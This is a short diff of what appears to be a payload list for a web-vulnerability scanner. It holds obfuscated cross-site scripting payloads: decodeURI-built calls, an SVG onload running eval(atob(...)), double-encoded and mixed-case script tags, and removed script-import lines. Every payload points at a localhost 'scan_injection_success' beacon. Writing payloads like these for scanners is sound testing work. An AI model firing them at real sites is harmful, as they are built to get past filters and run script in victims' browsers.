@@ -85,7 +85,3 @@ Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](decodeURI('%6C%6F%63%61%
 ><sVg oNlOaD='window['eval'](window['atob']('bG9jYXRpb24uaHJlZj0iaHR0cDovLzEyNy4wLjAuMS9zY2FuX2luamVjdGlvbl9zdWNjZXNzIg=='))'>
 %253Cscript%253Elocation.href='http://127.0.0.1/scan_injection_success'%253C/script%253E
 %253CsCrIpT%253ElOcAtIoN.hReF='http://127.0.0.1/scan_injection_success'%253C/sCripT%253E
-<script>import('http://127.0.0.1/scan_injection_success');<script>
-<sCrIpT>import('http://127.0.0.1/scan_injection_success');<sCrIpT>
-><script>import('http://127.0.0.1/scan_injection_success');<script>
-><sCrIpT>import('http://127.0.0.1/scan_injection_success');<sCrIpT>
